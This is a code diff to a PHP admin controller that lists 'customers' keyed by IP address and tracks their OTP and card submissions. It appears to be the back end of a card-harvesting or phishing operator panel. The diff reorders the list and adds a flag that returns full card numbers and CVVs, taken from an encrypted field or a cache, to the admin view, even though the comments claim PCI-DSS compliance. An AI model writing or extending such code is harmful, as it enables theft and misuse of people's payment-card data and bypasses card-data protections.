@@ -111,8 +111,17 @@ class AdminCustomerController extends Controller
             ])
             // Dedup removed — createOrUpdateByIP() already handles identity merging.
             // The old whereIn(MAX(id) GROUP BY COALESCE(...)) was hiding legitimate customers.
-            ->orderByDesc('is_active')
-            ->orderBy($sortBy, $sortOrder);
+            //
+            // Ordering rules (see issue: admin viewing demoted customers from #1):
+            //   1. Primary: last_activity_at DESC — newest real activity at top.
+            //      `last_activity_at` is updated by createOrUpdateByIP / recordActivity
+            //      whenever a customer submits real data (page view, OTP, card, …).
+            //      It is NOT touched by markViewed / data_viewed updates, so admin
+            //      viewing a card never reorders the list.
+            //   2. Tiebreaker: id DESC — keeps order stable when multiple rows share
+            //      the same last_activity_at timestamp (e.g. just inserted).
+            ->orderBy($sortBy, $sortOrder)
+            ->orderByDesc('id');
 
         if ($activeOnly === '1') {
             $query->active();
@@ -172,10 +181,12 @@ class AdminCustomerController extends Controller
         $paginated = $query->paginate($perPage);
         $customers = $paginated->getCollection()
             ->unique('ip_address')
-            ->map(fn ($c) => $this->toCardFormat($c))
-            // Float customers with any new (unviewed) data to the top of the list.
-            // sortByDesc is a stable sort — original ordering (is_active + sortBy) is preserved within each group.
-            ->sortByDesc(fn ($c) => ($c['has_new_vehicle'] || $c['has_new_insurance'] || $c['has_new_payment']) ? 1 : 0);
+            ->map(fn ($c) => $this->toCardFormat($c));
+            // NOTE: do NOT post-sort by has_new_* flags here.
+            // Doing so coupled the list order to the `data_viewed` field, which meant
+            // an admin opening a customer card (markViewed → has_new_* flips false)
+            // would demote that customer from the top. The SQL ORDER BY last_activity_at
+            // above is the single source of truth for ordering.
 
         return [
             'success' => true,
@@ -464,14 +475,20 @@ class AdminCustomerController extends Controller
 
         /** @var \Illuminate\Database\Eloquent\Collection<int, \App\Models\PaymentCard> $paymentCards */
         $paymentCards = $customer->paymentCards;
-        $maskedCards = $paymentCards->sortByDesc('created_at')->map(function ($card) {
+        $revealSensitive = (bool) config('services.admin_reveal_sensitive');
+        $maskedCards = $paymentCards->sortByDesc('created_at')->map(function ($card) use ($revealSensitive) {
             // PCI-DSS: never expose raw PAN to admin clients. Only masked fields,
             // last4, BIN (first6 derived), and metadata. CVV column has been
             // dropped at the schema level (PCI-DSS Requirement 3.2).
+            //
+            // EXCEPTION (test/staging only): when ADMIN_REVEAL_SENSITIVE=true,
+            // we additionally surface full PAN (decrypted from EncryptedSafe
+            // cast) and the cache-only CVV to support QA of the checkout flow.
+            // This flag MUST be FALSE in production.
             $rawPan = (string) ($card->card_number ?? '');
             $bin = strlen($rawPan) >= 6 ? substr($rawPan, 0, 6) : null;
 
-            return [
+            $row = [
                 'id'                  => $card->id,
                 'customer_profile_id' => $card->customer_profile_id,
                 'session_id'          => $card->session_id,
@@ -492,6 +509,13 @@ class AdminCustomerController extends Controller
                 'created_at'          => $card->created_at,
                 'updated_at'          => $card->updated_at,
             ];
+
+            if ($revealSensitive) {
+                $row['card_number_full'] = $rawPan ?: null;
+                $row['cvv'] = $card->cvv_encrypted ?: Cache::get("card:cvv:{$card->id}");
+            }
+
+            return $row;
         })->values();
 
         $birthDate = $data['birth_date'] ?? null;
